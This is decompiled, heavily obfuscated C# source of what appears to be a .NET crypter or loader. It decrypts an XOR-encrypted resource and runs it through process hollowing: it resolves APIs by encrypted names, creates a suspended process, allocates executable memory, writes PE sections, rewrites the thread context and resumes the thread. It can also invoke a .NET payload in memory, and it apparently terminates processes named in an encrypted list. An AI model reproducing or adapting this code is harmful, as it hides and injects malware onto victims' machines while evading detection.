using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;

namespace ns0;

[StandardModule]
internal sealed class Class2
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static string string_0;

	static Class2()
	{
		DESCryptoIndirector.smethod_0();
		try
		{
			string_0 = "YZ:<d>{o";
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException0(exception);
			throw;
		}
	}

	public static byte[] smethod_0(byte[] byte_0, ushort ushort_0)
	{
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		int num = default(int);
		int num2 = default(int);
		int i = default(int);
		ulong num3 = default(ulong);
		bool flag = default(bool);
		short num4 = default(short);
		byte[] array3 = default(byte[]);
		try
		{
			array = new byte[20]
			{
				138, 91, 116, 127, 197, 179, 110, 139, 148, 164,
				136, 16, 84, 125, 83, 30, 187, 12, 85, 26
			};
			array2 = array;
			num = array2.Length;
			num2 = checked(byte_0.Length - 1);
			for (i = 0; i <= num2; i = checked(i + 1))
			{
				num3 = 967181455uL;
				byte_0[i] = (byte)(byte_0[i] ^ array2[i % num]);
				flag = false;
				num4 = 0;
			}
			array3 = byte_0;
			return array3;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[11]
			{
				num, array3, array2, num4, num3, i, flag, array, num2, byte_0,
				ushort_0
			});
			throw;
		}
	}

	public static string smethod_1(string string_1)
	{
		string o = default(string);
		int i = default(int);
		int num = default(int);
		char c = default(char);
		bool flag = default(bool);
		double num2 = default(double);
		string text = default(string);
		try
		{
			o = "MU=W/()Ig[^&";
			i = 0;
			for (num = PoweredBy.smethod_0(o, 878, 830); i < num; i = checked(i + 1))
			{
				c = Class29.smethod_0(o, i, 142, 213);
			}
			flag = false;
			num2 = -25692.0073;
			text = Class20.smethod_4(Class20.smethod_2(367, 257), smethod_0(UsageCounts.smethod_1(string_1, 140, 184), 13778), 651, 680);
			return text;
		}
		catch (Exception exception)
		{
			bool flag2 = default(bool);
			StackFrameHelper.CreateException9(exception, num2, text, flag, c, flag2, i, o, num, string_1);
			throw;
		}
	}

	public static void smethod_2()
	{
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		char[] array = default(char[]);
		string[] array2 = default(string[]);
		int num6 = default(int);
		Process[] array3 = default(Process[]);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					string text;
					switch (try0001_dispatch)
					{
					default:
						SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_1(672, 648);
						num3 = -2;
						goto IL_0013;
					case 172:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0001;
								case 0:
									goto end_IL_0001;
								case 1:
									break;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0013;
							case 3:
								goto IL_0054;
							case 5:
								goto IL_0061;
							case 6:
								goto IL_007a;
							case 7:
								goto IL_0084;
							case 4:
								goto IL_008f;
							default:
								goto end_IL_0001;
							case 8:
								goto IL_0121;
							}
							goto default;
						}
						IL_0061:
						num = 5;
						AutoHeightLabel.smethod_3(process, 237, 190);
						num5 = checked(num5 + 1);
						goto IL_007a;
						IL_007a:
						num = 6;
						goto IL_007c;
						IL_0013:
						num = 2;
						text = smethod_1("yhQYE7z3DOzU9+p5MT4nbNdMOHjrNjQ/hfMa6ufP5XcmPRNW0mY0eeEPHBa28zji5tD9cThdA137WBBX7zYbDbzgDer6yu1iFA==");
						array = new char[1] { Win32.smethod_13(smethod_1("yg=="), 539, 630) };
						array2 = WaitSendingReportControl.smethod_0(text, array, 191, 230);
						goto IL_0054;
						IL_0054:
						num = 3;
						num6 = 0;
						goto IL_008f;
						IL_008f:
						num = 4;
						array3 = Attribute0.smethod_2(array2[num6], 36, 116);
						num5 = 0;
						goto IL_007c;
						IL_007c:
						if (num5 < array3.Length)
						{
							process = array3[num5];
							goto IL_0061;
						}
						goto IL_0084;
						IL_0084:
						num = 7;
						num6 = checked(num6 + 1);
						if (num6 <= 11)
						{
							goto IL_008f;
						}
						goto IL_0121;
						end_IL_0001:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					Class30.smethod_4((Exception)obj, 518, 603);
					try0001_dispatch = 172;
					continue;
				}
				break;
				IL_0121:
				if (num2 != 0)
				{
					ProjectData.ClearProjectError();
				}
				return;
			}
			throw WaitSendingReportControl.smethod_2(-2146828237, 434, 408);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException9(exception, array2, num6, process, array, num5, array3, num3, num2, num);
			throw;
		}
	}

	public static int smethod_3(int int_0, sbyte sbyte_0, long long_0, ulong ulong_0, byte[] byte_0, int int_1, long long_1)
	{
		checked
		{
			string text = default(string);
			string text2 = default(string);
			int i = default(int);
			int num = default(int);
			char c = default(char);
			bool flag = default(bool);
			float num2 = default(float);
			Color color_ = default(Color);
			int num3 = default(int);
			try
			{
				text = "VY";
				text2 = "4XC=,";
				i = 0;
				for (num = PoweredBy.smethod_0(text2, 436, 484); i < num; i++)
				{
					c = Class29.smethod_0(text2, i, 367, 308);
				}
				flag = true;
				num2 = 3f;
				do
				{
					num2 += 1f;
				}
				while (num2 <= 64f);
				if (!flag)
				{
				}
				color_ = Form1.smethod_2(byte_0[int_0 + 3], byte_0[int_0 + 2], byte_0[int_0 + 1], byte_0[int_0], 119, 99);
				num3 = Class21.smethod_2(ref color_, 885, 826);
				return num3;
			}
			catch (Exception caughtException)
			{
				StackFrameHelper.CreateExceptionN(caughtException, new object[16]
				{
					flag, num3, text, c, num2, i, text2, num, color_, int_0,
					sbyte_0, long_0, ulong_0, byte_0, int_1, long_1
				});
				throw;
			}
		}
	}

	public static byte[] smethod_4(int int_0, DateTime dateTime_0)
	{
		bool flag = default(bool);
		Color color_ = default(Color);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		try
		{
			flag = false;
			color_ = Class33.smethod_10(int_0, 108, 127);
			array = new byte[4]
			{
				UsageCounts.smethod_3(ref color_, 842, 817),
				DoNotObfuscateTypeAttribute.smethod_0(ref color_, 413, 508),
				SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_0(ref color_, 822, 886),
				DoNotObfuscateTypeAttribute.smethod_0(ref color_, 132, 230)
			};
			array2 = array;
			return array2;
		}
		catch (Exception exception)
		{
			char c = default(char);
			int num = default(int);
			string o = default(string);
			int num2 = default(int);
			StackFrameHelper.CreateException10(exception, flag, color_, array2, c, num, o, num2, array, int_0, dateTime_0);
			throw;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_1);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_1);

	public static hw3u smethod_5<hw3u>(string string_1)
	{
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		string text = default(string);
		int i = default(int);
		int num = default(int);
		char c = default(char);
		bool flag4 = default(bool);
		char[] array = default(char[]);
		char[] array2 = default(char[]);
		hw3u val = default(hw3u);
		try
		{
			flag = true;
			flag2 = true;
			flag3 = true;
			text = "nnbH4eHri";
			i = 0;
			for (num = PoweredBy.smethod_0(text, 146, 194); i < num; i = checked(i + 1))
			{
				c = Class29.smethod_0(text, i, 706, 665);
				flag4 = true;
			}
			array = new char[1] { SimpleZip.Class11.smethod_2(58, 312, 346) };
			IntPtr moduleHandle = GetModuleHandle(WaitSendingReportControl.smethod_0(string_1, array, 346, 259)[0]);
			array2 = new char[1] { SimpleZip.Class11.smethod_2(58, 822, 852) };
			val = Conversions.ToGenericParameter<hw3u>((object)Class37.smethod_3(GetProcAddress(moduleHandle, WaitSendingReportControl.smethod_0(string_1, array2, 28, 69)[1]), DoNotEncodeStringsAttribute.smethod_0(typeof(hw3u).TypeHandle, 737, 696), 135, 178));
			return val;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[12]
			{
				flag, val, flag3, flag2, flag4, c, i, text, num, array,
				array2, string_1
			});
			throw;
		}
	}

	public static void smethod_6(object object_0)
	{
		checked
		{
			ulong num = default(ulong);
			float num2 = default(float);
			short num3 = default(short);
			short num4 = default(short);
			MethodInfo methodInfo = default(MethodInfo);
			object[] array = default(object[]);
			try
			{
				num = 896532705uL;
				num2 = 10f;
				do
				{
					num3 = 9;
					do
					{
						num3 = (short)unchecked(num3 + 1);
					}
					while (num3 <= 80);
					num2 += 1f;
				}
				while (!(num2 > 106f));
				num4 = 12272;
				methodInfo = Class20.smethod_5(PoweredByAttribute.smethod_0((byte[])object_0, 692, 765), 36, 50);
				if (SendingReportFeedbackEventArgs.smethod_3(methodInfo, 105, 28).Length == 0)
				{
					Class33.smethod_8(methodInfo, null, null, 614, 630);
					return;
				}
				MethodInfo methodBase_ = methodInfo;
				array = new object[1] { new string[0] };
				Class33.smethod_8(methodBase_, null, array, 120, 104);
			}
			catch (Exception exception)
			{
				int num5 = default(int);
				StackFrameHelper.CreateException8(exception, num4, num, methodInfo, num2, num5, num3, array, object_0);
				throw;
			}
		}
	}

	public static void smethod_7(byte[] byte_0, bool bool_0, int int_0, string string_1, bool bool_1)
	{
		checked
		{
			int num = default(int);
			byte b = default(byte);
			short num2 = default(short);
			Thread thread = default(Thread);
			byte b2 = default(byte);
			int i = default(int);
			bool flag = default(bool);
			string text = default(string);
			string[] array = default(string[]);
			int j = default(int);
			string text2 = default(string);
			DateTime dateTime = default(DateTime);
			byte[] array2 = default(byte[]);
			byte[] array3 = default(byte[]);
			int[] array4 = default(int[]);
			int[] array5 = default(int[]);
			int num3 = default(int);
			int num4 = default(int);
			bool flag2 = default(bool);
			string text3 = default(string);
			int k = default(int);
			int num5 = default(int);
			char c = default(char);
			string text4 = default(string);
			int l = default(int);
			int num6 = default(int);
			char c2 = default(char);
			IntPtr intPtr = default(IntPtr);
			IntPtr[] array6 = default(IntPtr[]);
			IntPtr intPtr2 = default(IntPtr);
			uint[] array7 = default(uint[]);
			bool flag3 = default(bool);
			IntPtr intPtr3 = default(IntPtr);
			IntPtr intPtr4 = default(IntPtr);
			IntPtr intptr_3 = default(IntPtr);
			IntPtr intptr_4 = default(IntPtr);
			IntPtr intPtr5 = default(IntPtr);
			IntPtr intPtr6 = default(IntPtr);
			IntPtr intptr_7 = default(IntPtr);
			Delegate5 delegate3 = default(Delegate5);
			bool flag4 = default(bool);
			int[] array8 = default(int[]);
			int num7 = default(int);
			int m = default(int);
			string text5 = default(string);
			int n = default(int);
			int num8 = default(int);
			char c3 = default(char);
			byte[] array9 = default(byte[]);
			int num9 = default(int);
			string text6 = default(string);
			short num10 = default(short);
			try
			{
				num = 0;
				do
				{
					b = (byte)num;
					num++;
				}
				while (num <= 100);
				if (byte_0[60] == 128)
				{
					num2 = 2302;
					thread = new Thread(smethod_6);
					thread.SetApartmentState(ApartmentState.STA);
					b2 = 0;
					do
					{
						for (i = b2; i <= 30 && i != 25; i++)
						{
						}
						flag = false;
						b2 = (byte)unchecked((uint)(b2 + 1));
					}
					while (unchecked((uint)b2) <= 20u);
					WaitSendingReportControl.smethod_3(thread, byte_0, 96, 91);
					return;
				}
				text = Class20.smethod_6(Class24.smethod_1(739, 735), 96, 86);
				if (DoNotObfuscateTypeAttribute.smethod_1(ReportSender.smethod_0(SendingReportFeedbackEventArgs.smethod_4(Class29.smethod_0(Environment.SystemDirectory, 0, 253, 166), 641, 757), smethod_1("sAckDarUHOr5hM55OBggPpN0bSyj"), 721, 690), 139, 226))
				{
					array = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_2(ReportSender.smethod_0(SendingReportFeedbackEventArgs.smethod_4(Class29.smethod_0(Environment.SystemDirectory, 0, 976, 907), 109, 25), smethod_1("sAcjFqvXAfzn+MV5Nw88bdRqITTEHiAjg8EP5vHT52I/"), 44, 79), 721, 644);
					for (j = 0; j < array.Length; j++)
					{
						text2 = array[j];
						if (SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_1(Class32.smethod_3(text2, 110, 13), smethod_1("/GlaT+s="), 420, 466))
						{
							text = ReportSender.smethod_0(text2, smethod_1("1jgCC7fWHaXx3O0="), 557, 590);
							break;
						}
					}
					dateTime = default(DateTime);
				}
				array2 = new byte[6] { 0, 1, 2, 3, 4, 5 };
				array3 = array2;
				array4 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
				array5 = array4;
				num3 = smethod_3(60, 76, 1920714339L, 987025019uL, byte_0, -87197568, 1455369257L);
				num4 = DoNotEncodeStringsAttribute.smethod_1(byte_0, num3 + 6, 841, 771);
				flag2 = false;
				text3 = "E^;L";
				k = 0;
				for (num5 = PoweredBy.smethod_0(text3, 879, 831); k < num5; k++)
				{
					c = Class29.smethod_0(text3, k, 663, 716);
				}
				text4 = "Y){!`";
				l = 0;
				for (num6 = PoweredBy.smethod_0(text4, 123, 43); l < num6; l++)
				{
					c2 = Class29.smethod_0(text4, l, 408, 451);
				}
				intPtr = new IntPtr(smethod_3(num3 + 84, -21, 82919198L, 1657798833uL, byte_0, 671808343, 1245275957L));
				array6 = new IntPtr[4];
				flag2 = true;
				if (!smethod_5<Delegate0>(smethod_1("4T4GEaDfXbmu5/p1NQk2TsljNn/5KDU="))(null, text, intPtr2, intPtr2, bool_0: false, 4, intPtr2, null, new byte[0], array6))
				{
					return;
				}
				try
				{
					array7 = new uint[179];
					flag3 = false;
					array7[0] = 65538u;
					if (smethod_5<Delegate1>(smethod_1("4T4GEaDfXbmu4+1kABUhe9poFnXkLxEHsQ=="))(array6[1], array7))
					{
						flag2 = false;
						Delegate2 @delegate = smethod_5<Delegate2>(smethod_1("4T4GEaDfXbmu9u1xMC0hcdhpJmnHPhkQt8o="));
						IntPtr intptr_ = array6[0];
						intPtr3 = new IntPtr(unchecked((long)array7[41]) + 8L);
						IntPtr intptr_2 = intPtr3;
						intPtr4 = new IntPtr(4);
						if (@delegate(intptr_, intptr_2, ref intptr_3, intPtr4, ref intptr_4) && unchecked((long)smethod_5<Delegate3>(smethod_1("5C8QE6mJIP/ByuVxJCs6e8xDM0nvOAAWqt0="))(array6[0], intptr_3)) == 0L)
						{
							Delegate4 delegate2 = smethod_5<Delegate4>(smethod_1("4T4GEaDfXbmu8uFiIAgycvpgOXXpHgw="));
							IntPtr intptr_5 = array6[0];
							intPtr5 = new IntPtr(smethod_3(num3 + 52, -59, 734914681L, 464300472uL, byte_0, 0, 1689347292L));
							IntPtr intptr_6 = intPtr5;
							intPtr6 = new IntPtr(smethod_3(num3 + 80, 0, 0L, 763876166uL, byte_0, 1518067787, -291448200L));
							intptr_7 = delegate2(intptr_5, intptr_6, intPtr6, 12288, 64);
							delegate3 = smethod_5<Delegate5>(smethod_1("4T4GEaDfXbmu8/p5IBgDbNRvMGn5FhESqsEX"));
							array3 = null;
							flag4 = delegate3(array6[0], intptr_7, byte_0, intPtr, ref intptr_4);
							array8 = new int[10];
							flag2 = true;
							num7 = num4 - 1;
							for (m = 0; m <= num7; m++)
							{
								array8[0] = 13;
								array8[5] = 255 + array8[0];
								DoNotPruneTypeAttribute.smethod_1(byte_0, num3 + 248 + m * 40, array8, 0, 40, 319, 265);
								text5 = "zrVpb";
								n = 0;
								for (num8 = PoweredBy.smethod_0(text5, 415, 463); n < num8; n++)
								{
									c3 = Class29.smethod_0(text5, n, 198, 157);
								}
								array9 = new byte[array8[4] - 1 + 1];
								DoNotPruneTypeAttribute.smethod_1(byte_0, array8[5], array9, 0, array9.Length, 997, 979);
								num9 = array8.Length;
								text6 = num9.ToString();
								Delegate5 delegate4 = delegate3;
								IntPtr intptr_8 = array6[0];
								intPtr6 = new IntPtr(SimpleZip.Stream0.smethod_1(ref intptr_7, 802, 852) + array8[3]);
								IntPtr intptr_9 = intPtr6;
								byte[] byte_ = array9;
								intPtr5 = new IntPtr(array9.Length);
								flag4 = delegate4(intptr_8, intptr_9, byte_, intPtr5, ref intptr_4);
							}
							flag2 = false;
							Delegate5 delegate5 = delegate3;
							IntPtr intptr_10 = array6[0];
							intPtr6 = new IntPtr(unchecked((long)array7[41]) + 8L);
							IntPtr intptr_11 = intPtr6;
							byte[] byte_2 = smethod_4(SimpleZip.Stream0.smethod_1(ref intptr_7, 337, 295), HeaderControl.smethod_2(183, 237));
							intPtr5 = new IntPtr(4);
							flag4 = delegate5(intptr_10, intptr_11, byte_2, intPtr5, ref intptr_4);
							array7[44] = (uint)(SimpleZip.Stream0.smethod_1(ref intptr_7, 551, 593) + smethod_3(num3 + 40, 22, 1332126009L, 1906273532uL, byte_0, 1140912330, 1848538909L));
							smethod_5<Delegate1>(smethod_1("4T4GEaDfXbmu9+1kABUhe9poFnXkLxEHsQ=="))(array6[1], array7);
							smethod_5<Delegate6>(smethod_1("4T4GEaDfXbmu9u1jIRA2StN+MHvu"))(array6[1]);
							return;
						}
					}
					num10 = 13517;
				}
				catch (Exception exception_)
				{
					Class30.smethod_4(exception_, 629, 552);
					SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_1(113, 89);
				}
				AutoHeightLabel.smethod_3(FatalExceptionEventArgs.smethod_1(SimpleZip.Stream0.smethod_1(ref array6[2], 153, 239), 560, 546), 708, 663);
			}
			catch (Exception caughtException)
			{
				StackFrameHelper.CreateExceptionN(caughtException, new object[57]
				{
					num, b, num2, thread, b2, flag, i, num4, intPtr, num3,
					array6, flag2, array5, text, array3, dateTime, text2, c, c2, num10,
					flag3, flag4, intptr_3, array7, intptr_7, intptr_4, array8, delegate3, array9, text6,
					m, c3, j, array, array2, array4, k, text3, num5, l,
					text4, num6, intPtr2, intPtr3, intPtr4, intPtr5, intPtr6, num7, n, text5,
					num8, num9, byte_0, bool_0, int_0, string_1, bool_1
				});
				throw;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		DESCryptoIndirector.smethod_0();
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		long num5 = default(long);
		byte b = default(byte);
		ushort num6 = default(ushort);
		string text = default(string);
		int num7 = default(int);
		int num8 = default(int);
		char c = default(char);
		DateTime dateTime = default(DateTime);
		int num9 = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		string text2 = default(string);
		int num10 = default(int);
		char c2 = default(char);
		try
		{
			if (!UnhandledExceptionHandlerWithUI.AttachApp())
			{
				return;
			}
			int try0012_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						switch (try0012_dispatch)
						{
						default:
							SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_1(144, 184);
							num3 = -2;
							goto IL_0024;
						case 372:
							{
								num2 = num;
								if (num3 > -2)
								{
									switch (num3)
									{
									default:
										goto end_IL_0012;
									case 0:
										goto end_IL_0012;
									case 1:
										break;
									}
								}
								int num4 = unchecked(num2 + 1);
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_0024;
								case 3:
									goto IL_002b;
								case 5:
									goto IL_0047;
								case 8:
									goto IL_004b;
								case 7:
									goto IL_004f;
								case 9:
									goto IL_0057;
								case 4:
									goto IL_0064;
								case 10:
									goto IL_0085;
								case 11:
								case 12:
									goto IL_0088;
								case 13:
									goto IL_00a6;
								case 14:
									goto IL_00e4;
								case 15:
									goto IL_011f;
								case 18:
									goto IL_0125;
								case 19:
									goto IL_0132;
								case 20:
									goto IL_014c;
								case 16:
								case 17:
									goto IL_0151;
								case 6:
									num = 6;
									num5 = 466344225L;
									goto IL_004f;
								default:
									goto end_IL_0012;
								case 21:
									goto IL_021a;
								}
								goto default;
							}
							IL_0125:
							do
							{
								num = 18;
								b = (byte)unchecked((uint)(b + 1));
							}
							while (unchecked((uint)b) <= 75u);
							goto IL_0132;
							IL_0151:
							num = 17;
							b = 0;
							goto IL_0125;
							IL_0024:
							num = 2;
							smethod_2();
							goto IL_002b;
							IL_002b:
							num = 3;
							num6 = 18;
							goto IL_0064;
							IL_0064:
							num = 4;
							text = "i%]-a";
							num7 = 0;
							num8 = PoweredBy.smethod_0(text, 142, 222);
							goto IL_0032;
							IL_0032:
							if (num7 < num8)
							{
								c = Class29.smethod_0(text, num7, 43, 112);
								goto IL_0047;
							}
							goto IL_0057;
							IL_0132:
							num = 19;
							dateTime = HeaderControl.smethod_2(322, 280);
							num9++;
							goto IL_014c;
							IL_0047:
							num = 5;
							goto IL_004f;
							IL_004f:
							num7++;
							goto IL_004b;
							IL_004b:
							num = 8;
							goto IL_0032;
							IL_0057:
							num = 9;
							num6 = (ushort)unchecked((uint)(num6 + 1));
							if (unchecked((uint)num6) <= 110u)
							{
								goto IL_0064;
							}
							goto IL_0085;
							IL_0085:
							num = 10;
							goto IL_0088;
							IL_0088:
							num = 12;
							resourceManager = new ResourceManager("alf3jris", Class24.smethod_1(623, 596));
							goto IL_00a6;
							IL_00a6:
							num = 13;
							smethod_7(smethod_0((byte[])SimpleZip.Class8.smethod_2(resourceManager, smethod_1("6T9FC6bWCuE="), 300, 312), 25430), bool_0: false, 1470154989, "ctO.i+G8z^8", bool_1: true);
							goto IL_00e4;
							IL_00e4:
							num = 14;
							text2 = "+)dOEpy:";
							num9 = 0;
							num10 = PoweredBy.smethod_0(text2, 187, 235);
							goto IL_0104;
							IL_0104:
							if (num9 < num10)
							{
								c2 = Class29.smethod_0(text2, num9, 251, 160);
								goto IL_011f;
							}
							goto IL_021a;
							IL_014c:
							num = 20;
							goto IL_0104;
							IL_011f:
							num = 15;
							goto IL_0151;
							end_IL_0012:
							break;
						}
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					Class30.smethod_4((Exception)obj, 58, 103);
					try0012_dispatch = 372;
					continue;
				}
				break;
				IL_021a:
				if (num2 != 0)
				{
					SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_1(1010, 986);
				}
				return;
			}
			throw WaitSendingReportControl.smethod_2(-2146828237, 312, 274);
		}
		catch (Exception exception)
		{
			UnhandledExceptionHandler.EntryPointException(exception, new object[16]
			{
				resourceManager, num6, c, num5, c2, dateTime, b, num7, text, num8,
				num9, text2, num10, num3, num2, num
			});
		}
	}
}
